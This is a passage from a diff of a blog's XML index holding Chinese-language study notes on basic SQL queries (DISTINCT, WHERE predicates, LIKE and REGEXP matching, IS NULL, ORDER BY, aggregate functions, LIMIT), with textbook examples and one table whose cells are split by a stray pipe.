+![](https://gitee.com/wxpgitee/images/raw/master/image-20210329222841512.png)
+
+##### 选择表中若干元组
+
+##### 消除取值重复的行
+
+两个本来并不完全相同的元组在投影到指定的某些列上后,可能会变成相同的行.可以用DISTINCT消除它们,如果没有指定DISTINCT关键词,则默认为ALL
+
+> 查询选修了课程的学生学号
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br></pre></td></tr></table></figure>
+![](https://gitee.com/wxpgitee/images/raw/master/image-20210329223333574.png)
+
+>查询选修了课程的学生学号,使用DISTINCT消除重复行
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br></pre></td></tr></table></figure>
+![](https://gitee.com/wxpgitee/images/raw/master/image-20210329223506629.png)
+
+##### 查询满足条件的元组
+
+查询满足条件的元组可以通过WHERE子句实现
+
+<table>
+    <caption>WHERE子句常用的查询条件</caption>
+    <tr>
+        <th>查询条件</th>
+        <th>谓词</th>
+    </tr>
+    <tr>
+        <td>比较</td>
+        <td>=,>,!=,!>等</td>
+    </tr>
+    <tr>
+        <td>确定范围</td>
+        <td>BETWEEN AND,NOT BETWEEN AND</td>
+    </tr>
+    <tr>
+        <td>确定集合</td>
+        <td>IN,NOT IN</td>
+    </tr>
+    <tr>
+        <td>字符匹配</td>
+        <td>LIKE,NOT LIKE</td>
+    </tr>
+    <tr>
+        <td>空值</td>
+        <td>IS NULL,IS NOT NULL</td>
+    </tr>
+    <tr>
+        <td>多重条件(逻辑运算)</td>
+        <td>AND,OR,NOT</td>
+    </tr>
+</table>
+
+<h3 id="LIKE运算符"><a href="#LIKE运算符" class="headerlink" title="LIKE运算符"></a>LIKE运算符</h3><p>进行字符串的匹配</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">LIKE</span> <span class="string">&#x27;201215121&#x27;</span></span><br><span class="line"><span class="comment">-- 等价于 WHERE Sno=&#x27;201215121&#x27;</span></span><br><span class="line"><span class="comment">--如果LIKE后的匹配串中不含通配符,则可以用=代替;用!=或&lt;&gt;运算符代替NOT LIKE</span></span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;刘%&#x27;</span></span><br><span class="line"><span class="comment">-- %代表任意长度(长度可以为0)的字符串</span></span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;欧阳_&#x27;</span></span><br><span class="line"><span class="comment">-- _代表任意单个字符;数据库字符集为ASCII时一个汉字需要两个_,当字符集为GBK时需要一个_</span></span><br><span class="line"><span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">&#x27;DB\_Design&#x27;</span> <span class="keyword">ESCAPE</span><span class="string">&#x27;\&#x27;</span></span><br><span class="line"><span class="comment">-- 如果要查询的字符串本身就含有通配符%或_,这时需要使用ESCAPE&#x27;&lt;换码字符&gt;&#x27;对通配符进行转义;ESCAPE&#x27;\&#x27;表示&#x27;\&#x27;为换码字符</span></span><br></pre></td></tr></table></figure>
+<h3 id="REGEXP运算符"><a href="#REGEXP运算符" class="headerlink" title="REGEXP运算符"></a>REGEXP运算符</h3><p>正则表达式的缩写(regular expression)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="comment">-- WHERE last_name LIKE &#x27;%field%&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;field&#x27;</span></span><br><span class="line"><span class="comment">-- 等价与用LIKE</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;^field&#x27;</span></span><br><span class="line"><span class="comment">-- &#x27;^&#x27;表示以什么开头</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;field$&#x27;</span></span><br><span class="line"><span class="comment">-- &#x27;$&#x27;表示以什么结尾</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;field|mac|rose&#x27;</span></span><br><span class="line"><span class="comment">-- &#x27;|&#x27;表示或</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;[a-j]e&#x27;</span></span><br><span class="line"><span class="comment">-- [a-j]表示a到j任意一个字母</span></span><br></pre></td></tr></table></figure>
+<h3 id="IS-NULL运算符"><a href="#IS-NULL运算符" class="headerlink" title="IS  NULL运算符"></a>IS  NULL运算符</h3><p>搜索缺失属性的记录</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">WHERE</span> phone <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="comment">-- 查找电话号码为NULL</span></span><br><span class="line"><span class="keyword">WHERE</span> phone <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="comment">-- 查找电话号码不为NULL</span></span><br></pre></td></tr></table></figure>
+<h3 id="ORDER-BY子句"><a href="#ORDER-BY子句" class="headerlink" title="ORDER BY子句"></a>ORDER BY子句</h3><p>对查询结果按照一个或多个属性列的升序(ASC)或降序(DESC)排列,默认为升序.对于空值,排序时显示的次序由具体系统实现来决定.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Sdept,Sage <span class="keyword">DESC</span></span><br><span class="line"><span class="comment">-- 查询结果按照所在系的系号升序排列,同一系中学生按照年龄降序排列</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name,last_name</span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> birth_date</span><br><span class="line"><span class="comment">-- 选择first_name和last_name两列然后按照birth_date排序</span></span><br></pre></td></tr></table></figure>
+<h3 id="聚集函数"><a href="#聚集函数" class="headerlink" title="聚集函数"></a>聚集函数</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>聚集函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>COUNT(*)</td>
+<td>统计元组个数</td>
+</tr>
+<tr>
+<td>COUNT([DISTINCT\</td>
+<td>ALL] &lt;列名&gt;)</td>
+<td>统计一列中值的个数</td>
+</tr>
+<tr>
+<td>SUM([DISTINCT\</td>
+<td>ALL] &lt;列名&gt;)</td>
+<td>计算一列值的总和(此列必须为数值型)</td>
+</tr>
+<tr>
+<td>AVG([DISTINCT\</td>
+<td>ALL] &lt;列名&gt;)</td>
+<td>计算一列值的平均值(此列必须为数值型)</td>
+</tr>
+<tr>
+<td>MAX([DISTINCT\</td>
+<td>ALL] &lt;列名&gt;)</td>
+<td>求一列值中的最大值</td>
+</tr>
+<tr>
+<td>MIN([DISTINCT\</td>
+<td>ALL] &lt;列名&gt;)</td>
+<td>求一列值中的最小值</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>当聚集函数遇到空值时,除COUNT(*)外,都跳过空值而只处理非空值.COUNT(*)是对元组进行计数,某个元组的一个或部分列取空值不影响COUNT的统计结果</p>
+<h3 id="LIMIT子句"><a href="#LIMIT子句" class="headerlink" title="LIMIT子句"></a>LIMIT子句</h3><p>限制查询返回的记录,LIMIT子句要放在最后</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line">LIMIT <span class="number">3</span></span><br><span class="line"><span class="comment">-- 限制返回结果为前3个</span></span><br><span class="line">LIMIT <span class="number">6</span>,<span class="number">3</span></span><br><span class="line"><span class="comment">-- 跳过前6个,再选择3个</span></span><br></pre></td></tr></table></figure>
+<h3 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h3>]]></content>
+      <categories>
+        <category>数据库</category>
+      </categories>
+      <tags>
+        <tag>数据库</tag>
       </tags>
   </entry>
   <entry>
